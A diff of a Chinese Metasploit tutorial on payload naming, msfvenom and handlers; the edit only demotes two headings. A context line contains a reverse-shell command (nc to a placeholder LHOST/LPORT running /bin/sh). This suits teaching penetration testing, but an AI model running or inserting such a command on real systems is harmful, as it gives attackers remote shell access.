@@ -71,7 +71,7 @@ MSF 中的载荷(payload)共有以下三种:
 在遇见 "载荷" 一词时应结合上下文推断具体含义.  
 命名规则是 `<platform>/[arch]/<single>` 和 `<platform>/[arch]/<stage>/<stager>`, 比如 `windows/x64/meterpreter/reverse_tcp` 就代表 Windows 下使用 x64 指令集编写的使用 tcp 协议反向建立连接的 stager, 用于接收 meterpreter 这个 stage.  
 
-## 生成载荷
+### 生成载荷
 
 使用 msfvenom(msfpayload 和 msfencode 的替代品) 来生成载荷, 详情请参考[官方教程](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).  
 需要根据具体情况(包括漏洞利用方式, 架构, 系统, 环境, 通讯方式等)选择合适的载荷/编码器/格式等其他参数.  
@@ -94,7 +94,7 @@ nc [LHOST] [LPORT] -e /bin/sh
 
 选择 shell_reverse_tcp 作为载荷并建立连接.  
 
-## 建立连接
+### 建立连接
 
 使用 handler 来与目标中的 stager 建立连接, 并上传 stage.  
 
